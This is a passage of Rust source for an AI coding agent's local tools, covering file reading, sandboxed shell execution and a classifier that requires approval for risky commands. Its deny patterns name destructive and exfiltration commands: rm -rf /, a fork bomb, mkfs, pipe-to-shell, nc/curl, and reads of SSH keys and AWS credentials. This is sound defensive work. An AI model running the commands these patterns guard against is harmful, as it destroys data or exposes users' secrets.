//! Local tools the agent can run. Commands always go through an explicit
//! approval path when the permission mode requires it; there is no ambient
//! "run anything" path from the model.
//!
//! Every spawned process goes through [`crate::process::ProcessRunner`]
//! (timeout + cancel + process-tree kill + output caps).

use crate::process::{EnvPolicy, ProcessOutcome, ProcessRunner, ProcessSpec, ProcessStatus};
use std::fs;
use std::path::{Path, PathBuf};

/// True when a command looks destructive or system-wide.
pub fn is_dangerous_command(command: &str) -> bool {
    dangerous_reason(command).is_some()
}

/// Human-readable reason a command is treated as dangerous, if any.
pub fn dangerous_reason(command: &str) -> Option<&'static str> {
    match classify_command_risk(command) {
        CommandRisk::ReadOnly => None,
        risk => Some(risk.reason()),
    }
}

/// Shell-safety severity for one command. Highest matching category wins.
///
/// Ordered from least to most severe so `max()` / comparisons work.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum CommandRisk {
    /// Fixed builtins or Git metadata queries executed without hooks/pagers.
    ReadOnly,
    /// Shell filesystem mutation; cwd alone does not confine the target.
    FilesystemWrite,
    /// Network egress (curl, wget, git push/fetch/pull, http clients).
    Network,
    /// Package installers (npm/pip/cargo/brew/apt install…).
    PackageInstall,
    /// Process control (kill, pkill, taskkill, nested shell, stop services).
    ProcessControl,
    /// Handles credentials or dumps env/secrets (printenv-style, secret files).
    SensitiveData,
    /// An opaque executable, script, or shell expression cannot be proven safe.
    Unknown,
    /// History-rewriting / force git that can lose work.
    DestructiveGit,
    /// Disk wipe, privilege escalation, system shutdown, recursive delete of
    /// system roots — always requires approval, even in Full mode.
    Catastrophic,
}

impl CommandRisk {
    pub fn label(self) -> &'static str {
        match self {
            Self::ReadOnly => "ReadOnly",
            Self::FilesystemWrite => "FilesystemWrite",
            Self::Network => "Network",
            Self::PackageInstall => "PackageInstall",
            Self::ProcessControl => "ProcessControl",
            Self::SensitiveData => "SensitiveData",
            Self::Unknown => "Unknown",
            Self::DestructiveGit => "DestructiveGit",
            Self::Catastrophic => "Catastrophic",
        }
    }

    pub fn reason(self) -> &'static str {
        match self {
            Self::ReadOnly => "普通命令",
            Self::FilesystemWrite => "shell 文件写入，无法保证目标仅在项目内",
            Self::Network => "网络敏感命令",
            Self::PackageInstall => "安装依赖包",
            Self::ProcessControl => "控制系统进程",
            Self::SensitiveData => "可能触碰敏感数据",
            Self::Unknown => "命令或脚本的副作用未知，需要确认",
            Self::DestructiveGit => "破坏性 git 操作",
            Self::Catastrophic => "灾难性操作",
        }
    }

    pub fn is_catastrophic(self) -> bool {
        matches!(self, Self::Catastrophic)
    }

    /// Full mode still requires consent for opaque, sensitive, and external effects.
    pub fn needs_approval_in_full(self) -> bool {
        matches!(
            self,
            Self::Catastrophic
                | Self::DestructiveGit
                | Self::Unknown
                | Self::SensitiveData
                | Self::Network
                | Self::PackageInstall
                | Self::ProcessControl
                | Self::FilesystemWrite
        )
    }

    /// Auto mode auto-runs only read-only commands; every filesystem mutation
    /// still requires an explicit approval, even when it stays in the project.
    pub fn needs_approval_in_auto(self) -> bool {
        !matches!(self, Self::ReadOnly)
    }
}

/// Minimal environment keys inherited for agent shell commands.
/// Everything else from the parent process is dropped (explicit allowlist).
pub const AGENT_ENV_ALLOWLIST: &[&str] = &[
    "PATH",
    "HOME",
    "USER",
    "LOGNAME",
    "SHELL",
    "LANG",
    "LANGUAGE",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    "TMPDIR",
    "TMP",
    "TEMP",
    "PWD",
    "CI",
    "CARGO_HOME",
    "RUSTUP_HOME",
    "GOPATH",
    "GOROOT",
    "GOPROXY",
    "JAVA_HOME",
    "PYTHONPATH",
    "VIRTUAL_ENV",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
    "http_proxy",
    "https_proxy",
    "no_proxy",
];

/// Build the child env for agent commands: clear parent, keep allowlist only.
pub fn agent_env_policy() -> EnvPolicy {
    let mut vars = Vec::new();
    for key in AGENT_ENV_ALLOWLIST {
        if let Ok(val) = std::env::var(key) {
            vars.push((key.to_string(), val));
        }
    }
    // Ensure a usable PATH even if the parent had none.
    if !vars.iter().any(|(k, _)| k == "PATH") {
        vars.push(("PATH".into(), "/usr/local/bin:/usr/bin:/bin".into()));
    }
    EnvPolicy::Scrubbed { vars }
}

/// Split a shell line into rough tokens (quotes preserved as content).
/// Not a full parser — enough to stop naive substring bypasses like
/// `VAR=x rm -rf /` or `foo; rm`.
fn tokenize_shell(command: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut chars = command.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(ch) = chars.next() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => cur.push(ch),
            None => match ch {
                '\'' | '"' => {
                    quote = Some(ch);
                    cur.push(ch);
                }
                '\\' => {
                    if let Some(next) = chars.next() {
                        cur.push(next);
                    }
                }
                c if c.is_whitespace() => {
                    if !cur.is_empty() {
                        tokens.push(std::mem::take(&mut cur));
                    }
                }
                '|' | ';' | '&' | '>' | '<' => {
                    if !cur.is_empty() {
                        tokens.push(std::mem::take(&mut cur));
                    }
                    // collapse && || >>
                    if (ch == '|' || ch == '&' || ch == '>') && chars.peek() == Some(&ch) {
                        chars.next();
                        tokens.push(format!("{ch}{ch}"));
                    } else {
                        tokens.push(ch.to_string());
                    }
                }
                c => cur.push(c),
            },
        }
    }
    if !cur.is_empty() {
        tokens.push(cur);
    }
    tokens
}

/// Strip leading `VAR=value` assignments so the real command head is visible.
fn command_head_tokens(tokens: &[String]) -> Vec<String> {
    let mut i = 0;
    while i < tokens.len() {
        let t = tokens[i].trim_start_matches(['\'', '"']);
        if t.contains('=') && !t.starts_with('=') {
            let name_end = t.find('=').unwrap_or(0);
            let name = &t[..name_end];
            if !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                i += 1;
                continue;
            }
        }
        break;
    }
    tokens[i.min(tokens.len())..].to_vec()
}

fn basename(tok: &str) -> String {
    let t = tok.trim_matches(|c| c == '\'' || c == '"');
    t.rsplit('/').next().unwrap_or(t).to_ascii_lowercase()
}

pub fn search_files(project: &Path, query: &str) -> String {
    if query.trim().is_empty() {
        return "空查询".to_owned();
    }

    let mut context = crate::context::ContextManager::new(project, Default::default());
    if context.scan(&|| true).is_err() {
        return "搜索已取消".into();
    }
    let hits = context.collect(query, &|| true).unwrap_or_default();
    let mut paths: Vec<String> = hits.into_iter().map(|span| span.path).collect();
    for entry in context.file_map() {
        if entry.path.to_lowercase().contains(&query.to_lowercase()) {
            paths.push(entry.path.clone());
        }
    }
    paths.sort();
    paths.dedup();
    if paths.is_empty() {
        return "0 处匹配".into();
    }
    format!(
        "{} 个文件匹配：\n{}",
        paths.len(),
        paths.into_iter().take(12).collect::<Vec<_>>().join("\n")
    )
}

pub fn read_text(path: &Path, max_lines: usize) -> String {
    read_text_result(path, max_lines).unwrap_or_else(|error| format!("(无法读取: {error})"))
}

pub(crate) fn read_text_result(path: &Path, max_lines: usize) -> Result<String, String> {
    if crate::office::is_docx(&path.to_string_lossy()) {
        let doc = crate::office::read_docx(path, max_lines.saturating_mul(120))?;
        return Ok(if doc.truncated {
            format!("{}\n…（DOCX 正文已截断）", doc.text)
        } else {
            doc.text
        });
    }
    if crate::office::is_spreadsheet(&path.to_string_lossy()) {
        let sheet = crate::office::read_spreadsheet(path, max_lines.saturating_mul(120))?;
        let mut text = sheet.text;
        if sheet.truncated {
            text.push_str(&format!(
                "\n… 表格内容按预算截断（{} 个 sheet）",
                sheet.sheets
            ));
        }
        return Ok(text);
    }
    if fs::metadata(path).map_err(|e| e.to_string())?.len() > 8 * 1024 * 1024 {
        return Err("text file exceeds 8 MiB".into());
    }
    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
    if raw.as_bytes().contains(&0) {
        return Err("binary file refused".into());
    }
    let mut text = raw.lines().take(max_lines).collect::<Vec<_>>().join("\n");
    let total = raw.lines().count();
    if total > max_lines {
        text.push_str(&format!("\n… 共 {total} 行"));
    }
    Ok(text)
}

/// Outcome of a local command run (mapped from [`ProcessStatus`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandOutcomeKind {
    Success,
    /// Exited non-zero.
    Failed,
    /// Wall-clock timeout hit; process tree killed.
    TimedOut,
    /// alive() went false / user stop; process tree killed.
    Cancelled,
    /// Spawn or collection error.
    Error,
}

impl From<ProcessStatus> for CommandOutcomeKind {
    fn from(status: ProcessStatus) -> Self {
        match status {
            ProcessStatus::ExitSuccess => Self::Success,
            ProcessStatus::ExitFailure => Self::Failed,
            ProcessStatus::Timeout => Self::TimedOut,
            ProcessStatus::Cancelled => Self::Cancelled,
            ProcessStatus::SpawnFailure => Self::Error,
        }
    }
}

/// Structured truncation record for one command's combined output.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct TruncationInfo {
    /// Pre-truncation size in bytes when known (None if cut off mid-stream
    /// before the true total was observed).
    pub original_size: Option<u64>,
    pub truncated: bool,
    pub kept_head: usize,
    pub kept_tail: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandOutcome {
    pub kind: CommandOutcomeKind,
    pub output: String,
    pub exit_code: Option<i32>,
    pub duration_ms: u64,
    pub timed_out: bool,
    pub cancelled: bool,
    pub truncation: TruncationInfo,
}

/// Default wall-clock timeout for agent shell commands (seconds).
pub const DEFAULT_COMMAND_TIMEOUT_SECS: u64 = 60;
/// Hard cap so a mis-set timeout cannot run forever.
pub const MAX_COMMAND_TIMEOUT_SECS: u64 = 600;

/// Redact secret-looking material from command output, errors, commands, and
/// anything else that reaches the model, session log, or UI. Never prints raw
/// env dumps. Applied at every boundary (tool result, trace, session, events).
///
/// Re-exports the canonical implementation in `kodo_core::redact` so
/// `kodo-agent` and `kodo-memory` share one definition.
pub fn redact_secrets(text: &str) -> String {
    kodo_core::redact::redact_secrets(text)
}

/// Read a line range from a file with an output cap.
pub fn read_text_range(
    path: &Path,
    start_line: usize,
    end_line: usize,
    max_chars: usize,
) -> Result<String, String> {
    let start = start_line.max(1);
    let end = end_line.max(start);
    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
    let total = raw.lines().count();
    let body: Vec<&str> = raw.lines().skip(start - 1).take(end - start + 1).collect();
    let mut out = body.join("\n");
    if total > end || start > 1 {
        out = format!(
            "\n… 文件共 {total} 行，显示 {start}-{} …\n{out}",
            end.min(total)
        );
    }
    if out.chars().count() > max_chars {
        out = out.chars().take(max_chars).collect();
        out.push_str("\n…");
    }
    Ok(out)
}

/// Runs `command` under a wall-clock timeout, polling `alive`.
/// Cancel and timeout are distinct from ordinary command failure.
pub fn command_output_interruptible(
    cwd: &Path,
    command: &str,
    alive: &dyn Fn() -> bool,
) -> (String, Option<i32>, bool) {
    let outcome = command_run(cwd, command, alive, DEFAULT_COMMAND_TIMEOUT_SECS);
    (outcome.output, outcome.exit_code, outcome.cancelled)
}

/// Full command runner — thin adapter over [`ProcessRunner`].
/// Env is a minimal allowlist (not full parent inherit). cwd is the project.
pub fn command_run(
    cwd: &Path,
    command: &str,
    alive: &dyn Fn() -> bool,
    timeout_secs: u64,
) -> CommandOutcome {
    let began = std::time::Instant::now();
    let timeout = std::time::Duration::from_secs(timeout_secs.clamp(1, MAX_COMMAND_TIMEOUT_SECS));
    let mut env = agent_env_policy();
    let mut filters_disabled = false;
    let mut submodules_ignored = false;
    let command = if let Some(args) = read_only_git_args(command)
        .filter(|_| classify_command_risk(command) == CommandRisk::ReadOnly)
    {
        // Repository config must not turn an automatic query into a hook or pager run.
        if matches!(args[0], "status" | "diff") {
            submodules_ignored = true;
            let spec = ProcessSpec::shell(cwd,
                r#"git --no-pager --no-optional-locks -c core.fsmonitor=false config --null --name-only --get-regexp "^filter\..*\.(clean|smudge|process|required)$""#)
                .env(agent_env_policy())
                .timeout(timeout)
                .stdout_limit(48 * 1024)
                .stderr_limit(16 * 1024);
            let mut config = ProcessRunner::run(&spec, alive);
            let no_filters = config.status == ProcessStatus::ExitFailure
                && config.exit_code == Some(1)
                && config.stdout.is_empty()
                && config.stderr.is_empty();
            if !config.status.is_success() && !no_filters {
                return map_process_outcome(config, timeout_secs);
            }
            if config.stdout_hit_limit
                || config.stderr_hit_limit
                || config.stdout.contains('\u{fffd}')
                || (!config.stdout.is_empty() && !config.stdout.ends_with('\0'))
            {
                config.status = ProcessStatus::SpawnFailure;
                config.exit_code = None;
                config.stdout.clear();
                config.stderr = "无法完整检查 Git 过滤器，未执行自动查询".into();
                return map_process_outcome(config, timeout_secs);
            }
            if let EnvPolicy::Scrubbed { vars } = &mut env {
                let keys: Vec<_> = config
                    .stdout
                    .split('\0')
                    .filter(|key| !key.is_empty())
                    .collect();
                filters_disabled = !keys.is_empty();
                vars.push(("GIT_CONFIG_COUNT".into(), keys.len().to_string()));
                for (index, key) in keys.iter().enumerate() {
                    vars.push((format!("GIT_CONFIG_KEY_{index}"), (*key).to_owned()));
                    let value = if key.to_ascii_lowercase().ends_with(".required") {
                        "false"
                    } else {
                        ""
                    };
                    vars.push((format!("GIT_CONFIG_VALUE_{index}"), value.to_owned()));
                }
            }
        }
        let args = match args[0] {
            "diff" => format!(
                "diff --no-ext-diff --no-textconv --ignore-submodules=all {}",
                args[1..].join(" ")
            ),
            "status" => format!("status --ignore-submodules=all {}", args[1..].join(" ")),
            _ => args.join(" "),
        };
        format!("git --no-pager --no-optional-locks -c core.fsmonitor=false {args}")
    } else {
        command.to_owned()
    };
    let spec = ProcessSpec::shell(cwd, command)
        .timeout(
            timeout
                .saturating_sub(began.elapsed())
                .max(std::time::Duration::from_millis(1)),
        )
        .env(env)
        .stdout_limit(48 * 1024)
        .stderr_limit(16 * 1024);
    let outcome = ProcessRunner::run(&spec, alive);
    let mut outcome = map_process_outcome(outcome, timeout_secs);
    if filters_disabled {
        // shortcut: filters can change dirty-file detection; use approved commands when normalized results are needed.
        outcome.output.push_str(
            "\n[提示：本次 Git 查询已禁用过滤器，相关文件可能显示额外改动；请用经批准的命令核对。]",
        );
    }
    if submodules_ignored {
        // shortcut: nested repositories have independent filters; approve a complete query when submodule details matter.
        outcome.output.push_str(
            "\n[提示：本次自动 Git 查询忽略子模块内部状态；完整状态需经批准的命令核对。]",
        );
    }
    outcome
}

fn map_process_outcome(outcome: ProcessOutcome, timeout_secs: u64) -> CommandOutcome {
    let raw_combined = outcome.combined_output();
    let raw_len = if raw_combined == "(无输出)" {
        0
    } else {
        raw_combined.len() as u64
    };
    // ProcessRunner already byte-capped streams; note that when either hit.
    let stream_capped = outcome.stdout_hit_limit || outcome.stderr_hit_limit;

    let mut text = raw_combined;
    if let Some(note) = outcome.note_suffix() {
        if !text.is_empty() && text != "(无输出)" {
            text.push('\n');
        }
        text.push_str(&note);
    }
    if text.trim().is_empty() {
        text = "(无输出)".to_owned();
    }
    let mut text = redact_secrets(&text);

    let mut truncation = TruncationInfo {
        original_size: if stream_capped {
            // True total unknown — stream was cut at the byte cap.
            None
        } else {
            Some(raw_len)
        },
        truncated: stream_capped,
        kept_head: 0,
        kept_tail: 0,
    };

    let soft_cap = 4000usize;
    if text.len() > soft_cap {
        let head_cap = 2800;
        let mut head_end = head_cap.min(text.len());
        while head_end > 0 && !text.is_char_boundary(head_end) {
            head_end -= 1;
        }
        let tail_start_candidates = text.len().saturating_sub(1000);
        let mut tail_start = tail_start_candidates;
        while tail_start < text.len() && !text.is_char_boundary(tail_start) {
            tail_start += 1;
        }
        if truncation.original_size.is_none() {
            // soft-cap observation of already-capped stream still truncates.
            truncation.original_size = None;
        } else {
            truncation.original_size = Some(text.len() as u64);
        }
        truncation.truncated = true;
        truncation.kept_head = head_end;
        truncation.kept_tail = text.len() - tail_start;
        let head = &text[..head_end];
        let tail = &text[tail_start..];
        let original = truncation
            .original_size
            .map(|n| n.to_string())
            .unwrap_or_else(|| "unknown".into());
        text = format!(
            "{head}\n… [output truncated: original_size={original} kept_head={} kept_tail={} truncated=true] …\n{tail}",
            truncation.kept_head, truncation.kept_tail
        );
    } else if stream_capped {
        truncation.truncated = true;
        // Record cap observation in the notice so the model knows.
        text.push_str(
            "\n… [output truncated: original_size=unknown truncated=true; stream byte cap hit] …",
        );
    }

    // Keep timeout note accurate when duration < full timeout (kill early).
    if outcome.timed_out {
        if let Some(pos) = text.rfind("[timed out after") {
            let rest = &text[pos..];
            if let Some(end) = rest.find(']') {
                let replacement = format!("[timed out after {timeout_secs}s; process tree killed]");
                text.replace_range(pos..pos + end + 1, &replacement);
            }
        }
    }

    CommandOutcome {
        kind: outcome.status.into(),
        output: text,
        exit_code: outcome.exit_code,
        duration_ms: outcome.duration_ms,
        timed_out: outcome.timed_out,
        cancelled: outcome.cancelled,
        truncation,
    }
}

/// Agent tools: list_files / search_text / find_symbol / read_range.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RepoToolRequest {
    ListFiles {
        prefix: Option<String>,
        limit: usize,
    },
    SearchText {
        query: String,
    },
    FindSymbol {
        name: String,
    },
    FindReferences {
        name: String,
    },
    ReadRange {
        path: String,
        start_line: usize,
        end_line: usize,
    },
}

/// Shell composition and opaque scripts always need approval, including Full.
pub fn classify_command_risk(command: &str) -> CommandRisk {
    let risk = classify_single_command_risk(command);
    let tokens = tokenize_shell(command);
    // Hard stops: anything that can swallow an argument or reach a shell
    // substitution is opaque to the static classifier. These keep the
    // old "always approval" behavior.
    if tokens.first().is_some_and(|t| t.contains('='))
        || command.contains(['\n', '\r', '`', '$'])
        || command.contains("$(")
        || command.contains("${")
        // Backgrounding `&` (alone, not part of `&&`) can fork and the
        // classifier can't see what the right side does.
        || tokens.iter().any(|t| t == "&")
        // Subshell `(...)` is a fresh scope — refuse to reason about it.
        || tokens.iter().any(|t| matches!(t.as_str(), "(" | ")"))
        // Bare `;` (without `&&` / `||`) is a footgun for read-only
        // review; keep it on the conservative path. The chain logic
        // below handles `&&` / `||` / `|` explicitly.
        || command.contains(';')
    {
        return risk.max(CommandRisk::Unknown);
    }

    // Compound-but-transparently-readable: a chain of `&&` or `||` is
    // allowed if **every** segment individually classifies as ReadOnly.
    // This is the fix for the "复合命令被只读权限策略拒绝" symptom in
    // review tasks — `git status && git diff --numstat` no longer
    // forces Full permission. Note we do NOT take this path for `;`
    // (kept conservative) or commands containing `>` / `<` (the
    // single-command path handles those via the absolute-path
    // heuristic and bumps to Catastrophic / FilesystemWrite correctly).
    if command.contains("&&") || command.contains("||") || command.contains('|') {
        return classify_chain_risk(command);
    }

    risk
}

/// Split on `&&` / `||` / `|` and classify every segment. Returns the
/// worst risk across segments. Empty segments force Unknown (the model
/// ran `cmd1 &&` and forgot the right side).
fn classify_chain_risk(command: &str) -> CommandRisk {
    let mut worst = CommandRisk::ReadOnly;
    for segment in command.split(['&', '|', ';']) {
        // `&&` / `||` split on a single char produces empty strings
        // between the operator and the next char. Drop them.
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        // Re-stitch the operator we lost: a segment that came from
        // `cmd1 && cmd2` arrives as `cmd1 ` and ` cmd2`. Recombine by
        // re-classifying the segment as-is.
        let seg_risk = classify_single_command_risk(trimmed);
        worst = worst.max(seg_risk);
    }
    if worst == CommandRisk::ReadOnly {
        CommandRisk::ReadOnly
    } else {
        worst.max(CommandRisk::Unknown)
    }
}

fn read_only_git_args(command: &str) -> Option<Vec<&str>> {
    if command.contains(['\n', '\r']) {
        return None;
    }
    let words: Vec<_> = command.split_ascii_whitespace().collect();
    let args = words.strip_prefix(&["git"])?;
    let args = args.strip_prefix(&["--no-pager"]).unwrap_or(args);
    let (sub, options) = args.split_first()?;
    let metadata_flag = |arg: &&str| {
        matches!(
            *arg,
            "--stat" | "--shortstat" | "--numstat" | "--name-only" | "--name-status"
        )
    };
    let safe = match *sub {
        "--version" => options.is_empty(),
        "status" => options.iter().all(|arg| {
            matches!(
                *arg,
                "--short"
                    | "-s"
                    | "--branch"
                    | "-b"
                    | "--porcelain"
                    | "--porcelain=v1"
                    | "--porcelain=v2"
                    | "-uno"
                    | "--untracked-files=no"
                    | "--untracked-files=normal"
                    | "--untracked-files=all"
            )
        }),
        "branch" => options.is_empty() || matches!(options, ["--show-current"] | ["--list"]),
        "rev-parse" => {
            !options.is_empty()
                && options.iter().all(|arg| {
                    matches!(
                        *arg,
                        "HEAD"
                            | "main"
                            | "origin/main"
                            | "--show-toplevel"
                            | "--show-prefix"
                            | "--is-inside-work-tree"
                            | "--verify"
                    )
                })
        }
        "log" => {
            options.contains(&"--oneline")
                && options.iter().enumerate().all(|(index, arg)| {
                    matches!(
                        *arg,
                        "--oneline"
                            | "--decorate"
                            | "--no-decorate"
                            | "HEAD"
                            | "main"
                            | "origin/main"
                    ) || arg
                        .strip_prefix("--max-count=")
                        .is_some_and(|n| n.parse::<u32>().is_ok())
                        || arg
                            .strip_prefix("-n")
                            .is_some_and(|n| n.parse::<u32>().is_ok())
                        || (*arg == "-n"
                            && options
                                .get(index + 1)
                                .is_some_and(|n| n.parse::<u32>().is_ok()))
                        || (index > 0 && options[index - 1] == "-n" && arg.parse::<u32>().is_ok())
                })
        }
        "diff" => {
            options.iter().any(metadata_flag)
                && options.iter().all(|arg| {
                    metadata_flag(arg)
                        || matches!(
                            *arg,
                            "--cached"
                                | "--staged"
                                | "--no-color"
                                | "--no-ext-diff"
                                | "--no-textconv"
                                | "HEAD"
                                | "main"
                                | "origin/main"
                        )
                })
        }
        _ => false,
    };
    safe.then(|| args.to_vec())
}

fn clearly_read_only(command: &str, head: &[String]) -> bool {
    let Some(first) = head.first() else {
        return false;
    };
    // Executable paths and assignment-based wrappers are not an allowlist.
    if first.contains('/') || first.contains('\\') {
        return false;
    }
    let args = &head[1..];
    if args.iter().any(|a| {
        a.starts_with("--pre") || a.starts_with("--exec") || a == "-exec" || a == "-execdir"
    }) {
        return false;
    }
    match first.as_str() {
        "echo" | "printf" | "pwd" | "true" | "false" => true,
        "git" => read_only_git_args(command).is_some(),
        _ => false,
    }
}

fn classify_single_command_risk(command: &str) -> CommandRisk {
    let tokens = tokenize_shell(command);
    let head = command_head_tokens(&tokens);
    let lower_all = command.to_ascii_lowercase();
    let mut risk = CommandRisk::ReadOnly;

    let mut bump = |r: CommandRisk| {
        if r > risk {
            risk = r;
        }
    };

    // --- Catastrophic ---
    if head.first().map(|s| basename(s)) == Some("sudo".into())
        || head.iter().any(|t| basename(t) == "sudo")
    {
        bump(CommandRisk::Catastrophic);
    }
    if head.first().map(|s| basename(s)) == Some("mkfs".into())
        || head.iter().any(|t| basename(t).starts_with("mkfs"))
        || head.iter().any(|t| t == "dd" || t.starts_with("dd "))
        || lower_all.contains(":(){")
        || lower_all.contains("fork bomb")
    {
        bump(CommandRisk::Catastrophic);
    }
    if head
        .first()
        .map(|s| basename(s))
        .is_some_and(|b| matches!(b.as_str(), "shutdown" | "reboot" | "halt" | "poweroff"))
    {
        bump(CommandRisk::Catastrophic);
    }
    // rm -rf of system / home roots (not a normal workspace file)
    if head.first().map(|s| basename(s)) == Some("rm".into()) {
        let recursive = tokens.iter().any(|t| {
            let t = t.trim_start_matches(['\'', '"']);
            t.starts_with("-") && t.contains('r') && t.contains('f')
        }) || lower_all.contains("rm -rf")
            || lower_all.contains("rm -fr");
        let targets_system = tokens.iter().any(|t| {
            let bare = t.trim_matches(|c| c == '\'' || c == '"');
            bare == "/"
                || bare == "/*"
                || bare.starts_with("/etc")
                || bare.starts_with("/usr")
                || bare.starts_with("/bin")
                || bare.starts_with("/sbin")
                || bare.starts_with("/boot")
                || bare.starts_with("/lib")
                || bare == "~"
                || bare == "~/"
                || bare.starts_with("~/")
                || bare.starts_with("$HOME")
        });
        if recursive && targets_system {
            bump(CommandRisk::Catastrophic);
        } else {
            bump(CommandRisk::FilesystemWrite);
        }
    }

    // --- DestructiveGit ---
    if head.first().map(|s| basename(s)) == Some("git".into()) {
        let mut git_args: Vec<String> = head.iter().skip(1).cloned().collect();
        while let Some(option) = git_args.first() {
            if matches!(option.as_str(), "-C" | "-c" | "--git-dir" | "--work-tree") {
                if git_args.len() < 2 {
                    break;
                }
                git_args.drain(..2);
            } else if option.starts_with("--git-dir=")
                || option.starts_with("--work-tree=")
                || matches!(option.as_str(), "--no-pager" | "--literal-pathspecs")
            {
                git_args.remove(0);
            } else {
                break;
            }
        }
        let sub = git_args.first().map(|s| s.to_ascii_lowercase());
        match sub.as_deref() {
            Some("push") => {
                if git_args
                    .iter()
                    .any(|a| a == "--force" || a == "-f" || a == "--force-with-lease")
                    || git_args.iter().any(|a| a.starts_with("--force"))
                {
                    bump(CommandRisk::DestructiveGit);
                } else {
                    bump(CommandRisk::Network);
                }
            }
            Some("fetch") | Some("pull") | Some("clone") | Some("ls-remote") => {
                bump(CommandRisk::Network)
            }
            Some("reset") if git_args.iter().any(|a| a == "--hard") => {
                bump(CommandRisk::DestructiveGit)
            }
            Some("clean") if git_args.iter().any(|a| a.starts_with('-')) => {
                bump(CommandRisk::DestructiveGit)
            }
            Some("checkout") | Some("restore")
                if git_args
                    .iter()
                    .any(|a| a == "." || a == "--" || a.starts_with("--source")) =>
            {
                // `git checkout .` / `git restore .` can wipe local edits
                if git_args.iter().any(|a| a == ".") {
                    bump(CommandRisk::DestructiveGit);
                } else {
                    bump(CommandRisk::FilesystemWrite);
                }
            }
            Some("add") | Some("commit") | Some("branch") | Some("switch") | Some("stash")
                if read_only_git_args(command).is_none() =>
            {
                bump(CommandRisk::FilesystemWrite);
            }
            _ => {}
        }
    }

    // --- PackageInstall ---
    let installer_heads = [
        "npm", "pnpm", "yarn", "pip", "pip3", "cargo", "brew", "apt", "apt-get", "yum", "dnf",
        "apk", "gem", "go", "uv",
    ];
    if let Some(h) = head.first().map(|s| basename(s)) {
        let installish = head.iter().any(|t| {
            let b = basename(t);
            b == "install" || b == "i" && (h == "npm" || h == "yarn" || h == "pnpm")
        });
        if installish && installer_heads.contains(&h.as_str()) {
            bump(CommandRisk::PackageInstall);
        }
        // cargo install / go get / go install
        if (h == "cargo" && head.iter().any(|t| basename(t) == "install"))
            || (h == "go"
                && head
                    .iter()
                    .any(|t| matches!(basename(t).as_str(), "get" | "install")))
        {
            bump(CommandRisk::PackageInstall);
        }
    }

    // --- Network ---
    if head.first().map(|s| basename(s)).is_some_and(|b| {
        matches!(
            b.as_str(),
            "curl" | "wget" | "nc" | "ncat" | "ssh" | "scp" | "sftp" | "ftp"
        )
    }) {
        bump(CommandRisk::Network);
    }

    // --- ProcessControl ---
    if head.first().map(|s| basename(s)).is_some_and(|b| {
        matches!(
            b.as_str(),
            "kill" | "killall" | "pkill" | "taskkill" | "kill -9" | "shutdown"
        )
    }) {
        bump(CommandRisk::ProcessControl);
    }
    if head
        .first()
        .map(|s| basename(s))
        .is_some_and(|b| matches!(b.as_str(), "sh" | "bash" | "zsh" | "dash"))
        && head.iter().any(|t| t == "-c")
    {
        bump(CommandRisk::ProcessControl);
    }

    // --- SensitiveData ---
    if head
        .first()
        .map(|s| basename(s))
        .is_some_and(|b| matches!(b.as_str(), "printenv" | "env" | "set"))
    {
        bump(CommandRisk::SensitiveData);
    }
    // Reading credential-shaped paths via shell (when not already higher)
    if lower_all.contains(".ssh/")
        || lower_all.contains("id_rsa")
        || lower_all.contains("id_ed25519")
        || lower_all.contains(".aws/credentials")
        || lower_all.contains(".env")
        || lower_all.contains(" secrets")
    {
        bump(CommandRisk::SensitiveData);
    }

    // --- FilesystemWrite: chmod/chown/write redirection ---
    if head.first().map(|s| basename(s)).is_some_and(|b| {
        matches!(
            b.as_str(),
            "chmod"
                | "chown"
                | "chgrp"
                | "mv"
                | "cp"
                | "tee"
                | "truncate"
                | "mkdir"
                | "touch"
                | "rmdir"
        )
    }) {
        bump(CommandRisk::FilesystemWrite);
    }
    // Write redirection: judge the redirect's own target, not "any `>` plus any
    // absolute path anywhere". `2>/dev/null` and `2>&1` are noise suppression,
    // not writes (they tokenize as `2` `>` `/dev/null` / `&` and used to ask
    // for approval as 灾难性操作 on plain read-only commands). Absolute /
    // `$HOME` targets can clobber system files from any command (`> /etc/hosts`)
    // and stay catastrophic even in Full; a workspace-relative target is an
    // ordinary file write.
    for (i, token) in tokens.iter().enumerate() {
        if token != ">" && token != ">>" {
            continue;
        }
        let target = tokens
            .get(i + 1)
            .map(|s| s.trim_matches(|c| c == '\'' || c == '"'))
            .unwrap_or("");
        let sink = target.is_empty()
            || target == "&" // `2>&1`
            || target == "/dev/null"
            || target.starts_with("/dev/std")
            || target.starts_with("/dev/fd/");
        if sink {
            continue;
        }
        if target.starts_with('/') || target.starts_with('~') || target.starts_with("$HOME") {
            bump(CommandRisk::Catastrophic);
        } else {
            bump(CommandRisk::FilesystemWrite);
        }
    }

    // Pipe-to-shell is catastrophic (download + execute).
    if tokens.iter().any(|t| t == "|") {
        let has_fetch = head
            .first()
            .map(|s| basename(s))
            .is_some_and(|b| matches!(b.as_str(), "curl" | "wget"));
        if has_fetch && lower_all.contains("sh") {
            bump(CommandRisk::Catastrophic);
        }
    }

    if risk == CommandRisk::ReadOnly && !clearly_read_only(command, &head) {
        CommandRisk::Unknown
    } else {
        risk
    }
}

/// Resolve `relative` under `project`, refusing escapes outside the root
/// and sensitive credential files even inside the workspace.
pub fn resolve_in_project(project: &Path, relative: &str) -> Result<PathBuf, String> {
    let relative = relative.trim();
    if relative.is_empty() {
        return Err("empty path".to_owned());
    }
    if Path::new(relative).is_absolute() {
        return Err("absolute paths are not allowed".to_owned());
    }
    if relative
        .replace('\\', "/")
        .split('/')
        .any(|part| part == "..")
    {
        return Err("path escapes the project root".to_owned());
    }
    if is_sensitive_relative_path(relative) {
        return Err("refusing to read or write a sensitive credential path".to_owned());
    }
    let full = project.join(relative);
